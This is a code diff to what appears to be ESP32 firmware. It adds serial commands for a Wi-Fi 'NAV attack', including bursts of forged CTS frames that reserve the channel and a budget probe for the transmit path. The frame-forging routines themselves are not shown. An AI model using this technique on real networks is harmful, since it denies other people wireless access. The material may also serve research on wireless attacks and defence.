@@ -121,6 +121,9 @@ void print_help() {
   Serial.println("INFO NAVSTAT                       NAV counters only (short line while NAV runs)");
   Serial.println("INFO NAVTX                         send one CTS/RTS/CF-End and print the driver verdict");
   Serial.println("INFO NAVITX                        probe esp_wifi_internal_tx with 500 CTS frames");
+  Serial.println("INFO NAVSEQ                        budget probe: RTS until it fails, then CTS/CF-End");
+  Serial.println("INFO NAVBURST <n> [release]        hard burst of n CTS (33ms cover each), optional CF-End release");
+  Serial.println("INFO RESTART                       esp_restart() (recovery from an exhausted TX pool)");
   Serial.println("INFO NAVSTOP                       stop the NAV attack");
   Serial.println("INFO NAVTEST                       dump the forged CTS/RTS/CF-End bytes");
   Serial.println("INFO MON <ch> <secs>               passive capture on one channel (ch=0 hops 1..13)");
@@ -1228,6 +1231,20 @@ void dispatch(char* line) {
     nav_tx_probe();
   } else if (strcmp(command, "NAVITX") == 0) {
     nav_itx_probe();
+  } else if (strcmp(command, "NAVSEQ") == 0) {
+    nav_budget_probe();
+  } else if (strcmp(command, "NAVBURST") == 0) {
+    char* count_token = strtok(nullptr, " 	");
+    char* release_token = strtok(nullptr, " 	");
+    const long count = count_token ? strtol(count_token, nullptr, 10) : 32;
+    const bool release = release_token != nullptr && strcmp(release_token, "release") == 0;
+    attack_stop();
+    nav_burst((int)(count < 1 ? 1 : (count > 64 ? 64 : count)), release);
+  } else if (strcmp(command, "RESTART") == 0) {
+    Serial.println("OK RESTART");
+    Serial.flush();
+    delay(100);
+    esp_restart();
   } else if (strcmp(command, "BARPUSH") == 0) {
     char* idx_token = strtok(nullptr, " \t");
     char* step_token = strtok(nullptr, " \t");
